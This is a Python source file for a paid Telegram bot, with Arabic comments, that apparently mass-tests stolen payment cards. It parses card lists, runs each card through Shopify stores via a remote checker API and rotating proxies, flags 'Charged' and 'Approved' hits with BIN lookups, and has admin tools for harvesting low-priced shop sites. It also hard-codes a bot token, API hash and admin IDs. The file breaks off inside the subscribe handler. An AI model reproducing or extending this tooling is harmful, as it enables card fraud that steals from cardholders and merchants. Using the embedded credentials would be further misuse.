import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import secrets
from datetime import datetime
from telethon import TelegramClient, events, Button
import requests

# ==================== إعدادات البوت ====================
CHECKER_API_URL = 'https://apiehopf-production.up.railway.app'

API_ID = 38208016
API_HASH = '0d52125034b6a0d0dac3e71b40cea032'
BOT_TOKEN = '8985561921:AAH26NPSH3Iin7RCpKfi1Q057X1umDjfgds'
ADMIN_IDS = [1093032296, 7077116674]
OWNER_CHANNEL_ID = -1002635018188
OWNER_CHANNEL_LINK = 'https://t.me/ReGict7'

# إعدادات الاشتراك
STAR_PRICES = {
    "1h": {"name": "1 Hour", "stars": 30, "seconds": 3600},
    "12h": {"name": "12 Hours", "stars": 50, "seconds": 43200},
    "1d": {"name": "1 Day", "stars": 100, "seconds": 86400},
    "3d": {"name": "3 Days", "stars": 250, "seconds": 259200},
    "7d": {"name": "1 Week", "stars": 500, "seconds": 604800},
}

MAX_CARDS_PER_COMBO = 5000
ADMIN_MAX_CARDS = 50000
PENDING_TIMEOUT = 300
MESSAGE_DELAY = 1.5
MAX_WORKERS = 6
ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments']

PRICE_RANGES = {
    "1": {"name": "🔰 1$ - 10$", "min": 1, "max": 10},
    "2": {"name": "💰 5$ - 20$", "min": 5, "max": 20},
    "3": {"name": "💎 10$ - 30$", "min": 10, "max": 30},
    "4": {"name": "⭐ No filter", "min": 0, "max": 999999}
}

user_last_message_time = {}
active_sessions = {}
user_current_check = {}
user_pending_mass = {}
user_pending_sites = {}

# استخدام جلسة ثابتة
SESSION_FILE = "sessions/sonic_bot"
os.makedirs('sessions', exist_ok=True)
for f in os.listdir('sessions'):
    if f.endswith('.session'):
        try:
            os.remove(os.path.join('sessions', f))
        except:
            pass

bot = TelegramClient(SESSION_FILE, API_ID, API_HASH)

# ==================== دوال الملفات ====================
def load_sites():
    if not os.path.exists('sites.txt'):
        return []
    try:
        with open('sites.txt', 'r', encoding='utf-8') as f:
            return [l.strip() for l in f if l.strip()]
    except:
        return []

def save_sites(sites):
    with open('sites.txt', 'w', encoding='utf-8') as f:
        for site in sites:
            f.write(f"{site}\n")

def get_user_proxy_file(user_id):
    return f"user_{user_id}_proxy.txt"

def load_user_proxies(user_id):
    path = get_user_proxy_file(user_id)
    if not os.path.exists(path):
        return []
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return [l.strip() for l in f if l.strip()]
    except:
        return []

def save_user_proxies(user_id, proxies):
    with open(get_user_proxy_file(user_id), 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

# ==================== دوال المستخدمين ====================
USERS_FILE = 'users.json'
CODES_FILE = 'codes.json'

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f, indent=2)

def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_codes(codes):
    with open(CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def get_user_subscription(user_id):
    users = load_users()
    data = users.get(str(user_id), {})
    expiry = data.get('subscription_expiry', 0)
    return expiry > time.time(), expiry

def get_user_time_left(user_id):
    if user_id in ADMIN_IDS:
        return "♾️ Unlimited"
    active, expiry = get_user_subscription(user_id)
    if active:
        remaining = int(expiry - time.time())
        return f"{remaining//3600}h {(remaining%3600)//60}m"
    return "❌ Expired"

def activate_subscription(user_id, plan_key):
    plan = STAR_PRICES.get(plan_key)
    if not plan:
        return False
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {}
    now = time.time()
    current = users[uid].get('subscription_expiry', 0)
    new_expiry = current + plan['seconds'] if current > now else now + plan['seconds']
    users[uid]['subscription_expiry'] = new_expiry
    users[uid]['premium'] = True
    save_users(users)
    return True

def create_activation_code(seconds=86400):
    codes = load_codes()
    code = secrets.token_hex(8).upper()
    codes[code] = {'seconds': seconds, 'used': False, 'used_by': None, 'created_at': datetime.now().isoformat()}
    save_codes(codes)
    return code

def activate_code(user_id, code):
    if user_id in ADMIN_IDS:
        return True, "👑 أنت أدمن!"
    codes = load_codes()
    if code not in codes:
        return False, "❌ كود غير صالح"
    data = codes[code]
    if data.get('used'):
        return False, "❌ الكود مستخدم"
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {}
    now = time.time()
    current = users[uid].get('subscription_expiry', 0)
    new_expiry = current + data['seconds'] if current > now else now + data['seconds']
    users[uid]['subscription_expiry'] = new_expiry
    users[uid]['premium'] = True
    data['used'] = True
    data['used_by'] = uid
    save_users(users)
    save_codes(codes)
    return True, f"✅ تم التفعيل! {data['seconds']//3600} ساعة"

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_user_blocked(user_id):
    return load_users().get(str(user_id), {}).get('blocked', False)

def block_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {}
    users[uid]['blocked'] = True
    save_users(users)

def unblock_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid in users:
        users[uid]['blocked'] = False
        save_users(users)

def get_all_users():
    return load_users()

async def create_user_if_not_exists(user_id, username):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            'user_id': user_id,
            'username': username,
            'registered_at': datetime.now().isoformat(),
            'subscription_expiry': 0,
            'premium': False,
            'blocked': False
        }
        save_users(users)

# ==================== دوال API ====================
def parse_proxy_url(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if '@' in proxy_str:
        return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return None

async def test_proxy_fast(proxy_str):
    proxy_url = parse_proxy_url(proxy_str)
    if not proxy_url:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Invalid'}
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=4)) as session:
            async with session.get("https://musicstore.myshopify.com", proxy=proxy_url, ssl=False) as resp:
                if resp.status == 200:
                    return {'proxy': proxy_str, 'status': 'alive', 'reason': 'OK'}
                return {'proxy': proxy_str, 'status': 'dead', 'reason': f'HTTP {resp.status}'}
    except:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Timeout'}

async def is_site_shopify(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return False, None
                raw = await resp.json()
                gateway = raw.get('Gateway', '').lower()
                if gateway and any(g in gateway for g in ALLOWED_GATEWAYS):
                    return True, gateway
                return False, gateway
    except:
        return False, None

async def get_site_min_price(site, proxy):
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'https://{site}/products.json?limit=50'
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
            async with session.get(url, ssl=False) as resp:
                if resp.status != 200:
                    return None
                data = await resp.json()
                min_price = None
                for product in data.get('products', []):
                    for variant in product.get('variants', []):
                        if variant.get('available', True):
                            try:
                                price = float(variant.get('price', 0))
                                if min_price is None or price < min_price:
                                    min_price = price
                            except:
                                pass
                return min_price
    except:
        return None

async def check_site_complete(site, proxy, price_range):
    is_shop, gateway = await is_site_shopify(site, proxy)
    if not is_shop:
        return {'site': site, 'status': 'dead', 'reason': f'Not Shopify'}
    if price_range["min"] > 0 or price_range["max"] < 999999:
        min_price = await get_site_min_price(site, proxy)
        if min_price is not None and min_price > price_range["max"]:
            return {'site': site, 'status': 'dead', 'reason': f'Price ${min_price:.2f} > ${price_range["max"]}'}
    return {'site': site, 'status': 'alive', 'reason': 'Shopify'}

async def check_card(card, site, proxy):
    try:
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={card}'
        if proxy:
            url += f'&proxy={proxy}'
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Dead', 'message': f'HTTP {resp.status}', 'card': card}
                raw = await resp.json()
        msg = raw.get('Response', '')
        price = raw.get('Price', 0.0)
        gateway = raw.get('Gateway', 'Shopify')
        try:
            price = f"${float(price):.2f}"
        except:
            price = "-"
        charged = ['ORDER_PLACED', 'PROCESSEDRECEIPT', 'ORDER_CONFIRMED', 'SUCCESS', 'CHARGED']
        approved = ['INSUFFICIENT_FUNDS', 'OTP_REQUIRED', '3D_SECURE']
        up = msg.upper()
        if any(k in up for k in charged):
            return {'status': 'Charged', 'message': msg, 'card': card, 'gateway': gateway, 'price': price}
        elif any(k in up for k in approved):
            return {'status': 'Approved', 'message': msg, 'card': card, 'gateway': gateway, 'price': price}
        return {'status': 'Dead', 'message': msg or 'Declined', 'card': card, 'gateway': gateway, 'price': price}
    except:
        return {'status': 'Dead', 'message': 'Error', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites/proxies', 'card': card}
    for _ in range(max_retries):
        res = await check_card(card, random.choice(sites), random.choice(proxies))
        if not res.get('retry'):
            return res
        await asyncio.sleep(0.5)
    return {'status': 'Dead', 'message': 'Max retries', 'card': card}

async def get_bin_info(card_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as resp:
                if resp.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await resp.json()
                return (data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'),
                        data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', ''))
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    matches = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
    cards = []
    for card, month, year, cvv in matches:
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def send_hit_message(user_id, result, hit_type, context=None):
    emoji = "💎" if hit_type == 'Charged' else "✅"
    status_text = "CHARGED" if hit_type == 'Charged' else "APPROVED"
    brand, typ, lvl, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    msg = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ HIT</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>BIN: {brand} - {typ} - {lvl}
Bank: {bank}
Country: {country} {flag}</pre>"""
    await send_with_retry(user_id, msg, parse_mode='html')
    if hit_type == 'Charged' and OWNER_CHANNEL_ID:
        try:
            channel_msg = f"<b>🎯 New Order!</b>\n👤 User: <code>{user_id}</code>\n💎 Status: CHARGED\n🌐 Gateway: {result.get('gateway', 'Unknown')}\n💰 Amount: {result.get('price', '-')}"
            await bot.send_message(OWNER_CHANNEL_ID, channel_msg, parse_mode='html')
        except:
            pass

async def send_with_retry(user_id, message, parse_mode='html', buttons=None, retry=0):
    now = time.time()
    last = user_last_message_time.get(user_id, 0)
    if now - last < MESSAGE_DELAY:
        await asyncio.sleep(MESSAGE_DELAY - (now - last))
    try:
        if buttons:
            result = await bot.send_message(user_id, message, buttons=buttons, parse_mode=parse_mode)
        else:
            result = await bot.send_message(user_id, message, parse_mode=parse_mode)
        user_last_message_time[user_id] = time.time()
        return result
    except Exception as e:
        if "flood" in str(e).lower():
            await asyncio.sleep(30)
            if retry < 3:
                return await send_with_retry(user_id, message, parse_mode, buttons, retry+1)
        raise

# ==================== حل مشكلة الدفع ====================
async def send_star_invoice(user_id, plan_key):
    plan = STAR_PRICES.get(plan_key)
    if not plan:
        return None
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendInvoice"
    payload = {
        "chat_id": user_id,
        "title": f"⭐ SONIC - {plan['name']}",
        "description": f"Subscribe for {plan['name']}\nUnlimited card checks!\n👑 @ISoonik",
        "payload": f"sub_{plan_key}",
        "provider_token": "",
        "currency": "XTR",
        "prices": json.dumps([{"label": plan['name'], "amount": plan['stars']}]),
        "start_parameter": "sonic_sub"
    }
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response.json()
    except Exception as e:
        print(f"Invoice error: {e}")
        return None

async def check_payments():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id+1}&timeout=30"
            resp = requests.get(url, timeout=35)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update.get('update_id', last_update_id)
                        if 'pre_checkout_query' in update:
                            query = update['pre_checkout_query']
                            query_id = query['id']
                            answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerPreCheckoutQuery"
                            requests.post(answer_url, json={"pre_checkout_query_id": query_id, "ok": True}, timeout=5)
                            print(f"✅ PreCheckout answered: {query_id}")
                        if 'message' in update and 'successful_payment' in update['message']:
                            await handle_successful_payment(update['message'])
        except Exception as e:
            print(f"Payment check error: {e}")
        await asyncio.sleep(2)

async def handle_successful_payment(message):
    try:
        user_id = message['from']['id']
        payment = message['successful_payment']
        payload = payment.get('invoice_payload', '')
        if payload.startswith("sub_"):
            plan_key = payload[4:]
            if activate_subscription(user_id, plan_key):
                plan = STAR_PRICES[plan_key]
                await send_with_retry(user_id, f"✅ <b>SONIC Subscription Activated!</b>\n\n⭐ Plan: {plan['name']}\n\n🔥 Enjoy!", parse_mode='html')
                for admin in ADMIN_IDS:
                    await bot.send_message(admin, f"💎 Star Payment!\nUser: <code>{user_id}</code>\nPlan: {plan['name']}\nAmount: {plan['stars']}⭐", parse_mode='html')
    except Exception as e:
        print(f"Payment handle error: {e}")

# ==================== الكيبوردات ====================
def get_main_keyboard():
    return [[Button.inline("📋 Commands", b"show_commands")], [Button.url("📢 Channel", OWNER_CHANNEL_LINK)]]

def get_back_keyboard():
    return [[Button.inline("🔙 Back", b"main_menu")]]

def get_sub_keyboard():
    kb = []
    for key, plan in STAR_PRICES.items():
        kb.append([Button.inline(f"⭐ {plan['name']} - {plan['stars']}⭐", f"sub_{key}".encode())])
    kb.append([Button.inline("🔙 Back", b"main_menu")])
    return kb

def get_price_kb():
    return [
        [Button.inline("🔰 1$ - 10$", b"price_1")],
        [Button.inline("💰 5$ - 20$", b"price_2")],
        [Button.inline("💎 10$ - 30$", b"price_3")],
        [Button.inline("⭐ No filter", b"price_4")],
        [Button.inline("🔙 Cancel", b"price_cancel")]
    ]

def get_mode_kb():
    return [
        [Button.inline("💎 CHARGES ONLY", b"mode_charges")],
        [Button.inline("💎 + ✅ ALL HITS", b"mode_all")],
        [Button.inline("❌ Cancel", b"mode_cancel")]
    ]

def get_admin_main_kb():
    return [
        [Button.inline("📊 Stats", b"admin_stats")],
        [Button.inline("📢 Broadcast", b"admin_broadcast")],
        [Button.inline("🔨 Block", b"admin_block")],
        [Button.inline("🔓 Unblock", b"admin_unblock")],
        [Button.inline("📈 Add Time", b"admin_add_time")],
        [Button.inline("🌐 Sites", b"admin_sites")],
        [Button.inline("🔙 Back", b"main_menu")]
    ]

def get_admin_sites_kb():
    return [
        [Button.inline("📋 View Sites", b"admin_view_sites")],
        [Button.inline("➕ Add Site", b"admin_add_site")],
        [Button.inline("🗑️ Remove Site", b"admin_remove_site")],
        [Button.inline("📁 Upload File", b"admin_upload_sites")],
        [Button.inline("🔍 Check Sites", b"admin_check_sites")],
        [Button.inline("💣 Clear All", b"admin_clear_sites")],
        [Button.inline("🔙 Back", b"admin_panel")]
    ]

async def get_user_stats_text(user_id, username):
    users = load_users()
    data = users.get(str(user_id), {})
    sites = len(load_sites())
    proxies = len(load_user_proxies(user_id))
    time_left = get_user_time_left(user_id)
    if user_id in ADMIN_IDS:
        status = "👑 ADMIN"
    else:
        active, _ = get_user_subscription(user_id)
        status = f"⭐ ACTIVE | {time_left}" if active else "🆓 EXPIRED"
    return f"""👋 Welcome @{username}!

🚀 <b>SONIC Account</b>

    ┣ 📝 Plan: {status}
    ┣ 🌐 Sites: {sites}
    ┣ 🔌 Your Proxies: {proxies}
    ┗ 💡 Max combo: {MAX_CARDS_PER_COMBO} cards

📢 <b>Channel:</b> @ReGict7
💡 <b>Buy:</b> /subscribe
🔌 <b>Proxies:</b> /addproxy
👑 <b>Owner:</b> @ISoonik"""

# ==================== أوامر البوت ====================
async def start(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply("🚫 Banned")
        return
    sender = await event.get_sender()
    username = sender.username or f"user_{user_id}"
    await create_user_if_not_exists(user_id, username)
    text = await get_user_stats_text(user_id, username)
    await event.reply(text, buttons=get_main_keyboard(), parse_mode='html')

async def help_command(event):
    await start(event)

async def profile(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply("🚫 Banned")
        return
    sender = await event.get_sender()
    username = sender.username or f"user_{user_id}"
    first_name = sender.first_name or "User"
    users = load_users()
    data = users.get(str(user_id), {})
    proxies = len(load_user_proxies(user_id))
    reg = data.get('registered_at', datetime.now().isoformat())[:10]
    active, expiry = get_user_subscription(user_id)
    expiry_str = datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S') if active else "No subscription"
    sites_count = len(load_sites())
    text = f"""<b>👤 SONIC Profile</b>
├ 🆔 ID: <code>{user_id}</code>
├ 👤 Name: {first_name}
├ 📝 Username: @{username}
├ 🌐 Total Sites: {sites_count}
├ 🔌 Your Proxies: {proxies}
├ ⭐ Status: {'👑 ADMIN' if is_admin(user_id) else '✅ PREMIUM' if active else '❌ FREE'}
├ 📅 Registered: {reg}
└ ⭐ Subscription: {'✅ Active until ' + expiry_str if active else '❌ No active subscription'}"""
    await event.reply(text, parse_mode='html', buttons=get_back_keyboard())

async def myproxy(event):
    user_id = event.sender_id
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply("❌ No proxies")
        return
    if len(proxies) <= 50:
        text = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(f"<b>📋 Proxies ({len(proxies)}):</b>\n\n{text}", parse_mode='html')
    else:
        path = f"proxies_{user_id}.txt"
        with open(path, 'w') as f:
            f.write("\n".join(proxies))
        await event.reply(file=path)
        os.remove(path)

async def addproxy(event):
    user_id = event.sender_id
    lines = event.text.split('\n')[1:]
    if not lines:
        await event.reply("❌ Send proxies after command, one per line")
        return
    current = load_user_proxies(user_id)
    new = [p.strip() for p in lines if p.strip() and p.strip() not in current]
    if not new:
        await event.reply("⚠️ No new proxies")
        return
    with open(get_user_proxy_file(user_id), 'a') as f:
        for p in new:
            f.write(f"{p}\n")
    await event.reply(f"✅ Added {len(new)} proxies\nTotal: {len(current)+len(new)}")

async def addproxies(event):
    user_id = event.sender_id
    if not event.is_reply:
        await event.reply("❌ Reply to a .txt file")
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply("❌ Reply to .txt file")
        return
    path = await reply.download_media()
    with open(path, 'r') as f:
        proxies = [l.strip() for l in f if l.strip()]
    os.remove(path)
    if not proxies:
        await event.reply("❌ No proxies")
        return
    current = load_user_proxies(user_id)
    new = [p for p in proxies if p not in current]
    if new:
        with open(get_user_proxy_file(user_id), 'a') as f:
            for p in new:
                f.write(f"{p}\n")
    await event.reply(f"✅ Added {len(new)} proxies\nTotal: {len(current)+len(new)}")

async def chkproxy(event):
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ /chkproxy ip:port")
        return
    msg = await event.reply("🔄 Checking...")
    res = await test_proxy_fast(args[1])
    if res['status'] == 'alive':
        await msg.edit(f"✅ <b>ALIVE</b>\n<code>{args[1]}</code>", parse_mode='html')
    else:
        await msg.edit(f"❌ <b>DEAD</b>\n{res['reason']}", parse_mode='html')

async def rmproxy(event):
    user_id = event.sender_id
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ /rmproxy ip:port")
        return
    proxy = args[1]
    proxies = load_user_proxies(user_id)
    if proxy not in proxies:
        await event.reply("❌ Not found")
        return
    save_user_proxies(user_id, [p for p in proxies if p != proxy])
    await event.reply("✅ Removed")

async def clearproxy(event):
    user_id = event.sender_id
    count = len(load_user_proxies(user_id))
    if count == 0:
        await event.reply("❌ No proxies")
        return
    save_user_proxies(user_id, [])
    await event.reply(f"✅ Cleared {count} proxies")

async def proxy_check(event):
    user_id = event.sender_id
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply("❌ No proxies")
        return
    msg = await event.reply(f"⚡ Checking {len(proxies)} proxies...")
    batch_size = 25
    alive = []
    total = len(proxies)
    for i in range(0, total, batch_size):
        batch = proxies[i:i+batch_size]
        tasks = [test_proxy_fast(p) for p in batch]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res['status'] == 'alive':
                alive.append(res['proxy'])
        await msg.edit(f"⚡ {min(i+batch_size, total)}/{total}\n✅ Alive: {len(alive)}")
    save_user_proxies(user_id, alive)
    await msg.edit(f"✅ <b>Proxy Check Complete!</b>\nTotal: {total}\n✅ Alive: {len(alive)}\n❌ Dead: {total-len(alive)}", parse_mode='html')

async def getproxy(event):
    user_id = event.sender_id
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply("❌ No proxies")
        return
    if len(proxies) <= 50:
        text = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(f"<b>📋 Proxies ({len(proxies)}):</b>\n\n{text}", parse_mode='html')
    else:
        path = f"proxies_{user_id}.txt"
        with open(path, 'w') as f:
            for i, p in enumerate(proxies):
                f.write(f"{i+1}. {p}\n")
        await event.reply(file=path)
        os.remove(path)

async def mcancel(event):
    user_id = event.sender_id
    for key in list(active_sessions.keys()):
        if key.startswith(f"{user_id}_"):
            del active_sessions[key]
    user_current_check[user_id] = False
    await event.reply("✅ Cancelled")

async def single_cc(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply("🚫 Banned")
        return
    if user_current_check.get(user_id):
        await event.reply("⏳ Wait...")
        return
    if not is_admin(user_id):
        active, _ = get_user_subscription(user_id)
        if not active:
            await event.reply("❌ No subscription\n/subscribe")
            return
    sites = load_sites()
    proxies = load_user_proxies(user_id)
    if not sites or not proxies:
        await event.reply("❌ Add sites and proxies")
        return
    args = event.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply("❌ /cc 4242424242424242|12|25|123")
        return
    cards = extract_cc(args[1])
    if not cards:
        await event.reply("❌ Invalid format")
        return
    card = cards[0]
    user_current_check[user_id] = True
    msg = await event.reply(f"⚡ Checking <code>{card}</code>...", parse_mode='html')
    try:
        res = await check_card_with_retry(card, sites, proxies, 3)
        brand, typ, lvl, bank, country, flag = await get_bin_info(card.split('|')[0])
        emoji = "💎" if res['status'] == 'Charged' else "✅" if res['status'] == 'Approved' else "❌"
        time_left = get_user_time_left(user_id)
        await msg.edit(f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 Result</b>
<blockquote>{emoji} Status: {res['status'].upper()}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {res['message'][:100]}</blockquote>
<blockquote>🌐 Gateway: {res.get('gateway', 'Unknown')} | 💰 {res.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>BIN: {brand} - {typ} - {lvl}
Bank: {bank}
Country: {country} {flag}</pre>
<b>⏱️ Time left: {time_left}</b>""", parse_mode='html')
        if res['status'] in ['Charged', 'Approved']:
            await send_hit_message(user_id, res, res['status'])
    except Exception as e:
        await msg.edit(f"❌ Error: {e}")
    finally:
        user_current_check[user_id] = False

async def mass_check(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply("🚫 Banned")
        return
    if user_current_check.get(user_id):
        await event.reply("⏳ Wait...")
        return
    if not is_admin(user_id):
        active, _ = get_user_subscription(user_id)
        if not active:
            await event.reply("❌ No subscription\n/subscribe")
            return
    if not event.is_reply:
        await event.reply("❌ Reply to .txt file with cards")
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply("❌ Reply to .txt file")
        return
    sites = load_sites()
    proxies = load_user_proxies(user_id)
    if not sites or not proxies:
        await event.reply("❌ Add sites and proxies")
        return
    path = await reply.download_media()
    with open(path, 'r') as f:
        cards = extract_cc(f.read())
    os.remove(path)
    if not cards:
        await event.reply("❌ No valid cards")
        return
    max_cards = MAX_CARDS_PER_COMBO if not is_admin(user_id) else ADMIN_MAX_CARDS
    if len(cards) > max_cards:
        await event.reply(f"⚠️ Max {max_cards} cards, checking first {max_cards}")
        cards = cards[:max_cards]
    user_pending_mass[user_id] = {'cards': cards, 'sites': sites, 'proxies': proxies}
    await event.reply("📋 Select mode:", buttons=get_mode_kb())

async def mode_select(event):
    user_id = event.sender_id
    data = event.data.decode()
    if data == "mode_cancel":
        if user_id in user_pending_mass:
            del user_pending_mass[user_id]
        await event.edit("❌ Cancelled")
        return
    mode = "charges_only" if data == "mode_charges" else "all_hits"
    pending = user_pending_mass.pop(user_id, None)
    if not pending:
        await event.edit("Session expired")
        return
    cards = pending['cards']
    sites = pending['sites']
    proxies = pending['proxies']
    user_current_check[user_id] = True
    session_key = f"{user_id}_{int(time.time())}"
    active_sessions[session_key] = {'paused': False, 'stop': False}
    msg = await event.edit(f"🚀 Starting {len(cards)} cards...")
    asyncio.create_task(run_mass_check(user_id, cards, sites, proxies, mode, session_key, msg.id))

async def run_mass_check(user_id, cards, sites, proxies, mode, session_key, msg_id):
    results = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards), 'checked': 0, 'start': time.time()}
    card_responses = []
    for idx, card in enumerate(cards):
        sess = active_sessions.get(session_key)
        if not sess or sess.get('stop'):
            break
        while sess.get('paused'):
            await asyncio.sleep(1)
            if not active_sessions.get(session_key):
                break
        res = await check_card_with_retry(card, sites, proxies, 1)
        results['checked'] += 1
        card_responses.append({'card': card, 'status': res['status'], 'msg': res['message'][:40]})
        if res['status'] == 'Charged':
            results['charged'].append(res)
            await send_hit_message(user_id, res, 'Charged')
        elif res['status'] == 'Approved' and mode == 'all_hits':
            results['approved'].append(res)
            await send_hit_message(user_id, res, 'Approved')
        elif res['status'] == 'Approved':
            results['approved'].append(res)
        else:
            results['dead'].append(res)
        if idx % 5 == 0 or idx == len(cards)-1:
            elapsed = int(time.time() - results['start'])
            recent = "\n".join([f"{'💎' if c['status']=='Charged' else '✅' if c['status']=='Approved' else '❌'} {c['card'][:8]}*** | {c['msg'][:30]}" for c in card_responses[-5:]])
            progress = f"""<b>💠 Progress</b>
<blockquote>💎 {len(results['charged'])} | ✅ {len(results['approved'])} | ❌ {len(results['dead'])}</blockquote>
<blockquote>📊 {results['checked']}/{results['total']}</blockquote>
<blockquote>⏱️ {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>📝 Recent:</b>
<code>{recent}</code>"""
            kb = [[Button.inline("⏸️", f"pause_{session_key}".encode()), Button.inline("▶️", f"resume_{session_key}".encode()), Button.inline("🛑", f"stop_{session_key}".encode())]]
            try:
                await bot.edit_message(chat_id=user_id, message_id=msg_id, text=progress, buttons=kb, parse_mode='html')
            except:
                pass
        await asyncio.sleep(random.uniform(0.8, 1.2))
    elapsed = int(time.time() - results['start'])
    hits = "\n".join([f"💎 <code>{r['card']}</code> | {r.get('price', '-')}" for r in results['charged'][:10]])
    if mode == 'all_hits':
        hits += "\n" + "\n".join([f"✅ <code>{r['card']}</code> | {r.get('price', '-')}" for r in results['approved'][:10]])
    if not hits:
        hits = "No hits"
    time_left = get_user_time_left(user_id)
    final = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ Final</b>
<blockquote>💎 {len(results['charged'])} | ✅ {len(results['approved'])} | ❌ {len(results['dead'])}</blockquote>
<blockquote>⏱️ Time: {elapsed//3600}h {(elapsed%3600)//60}m {elapsed%60}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 Hits</b>
<code>{hits}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⏱️ Time left: {time_left}</b>"""
    await bot.edit_message(chat_id=user_id, message_id=msg_id, text=final, parse_mode='html')
    if session_key in active_sessions:
        del active_sessions[session_key]
    user_current_check[user_id] = False

async def control_callback(event):
    data = event.data.decode()
    if data.startswith("pause_"):
        key = data[6:]
        if key in active_sessions:
            active_sessions[key]['paused'] = True
            await event.answer("⏸️ Paused")
    elif data.startswith("resume_"):
        key = data[7:]
        if key in active_sessions:
            active_sessions[key]['paused'] = False
            await event.answer("▶️ Resumed")
    elif data.startswith("stop_"):
        key = data[5:]
        if key in active_sessions:
            active_sessions[key]['stop'] = True
            del active_sessions[key]
            await event.answer("🛑 Stopped")

async def subscribe(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply("🚫 Banned")
        return
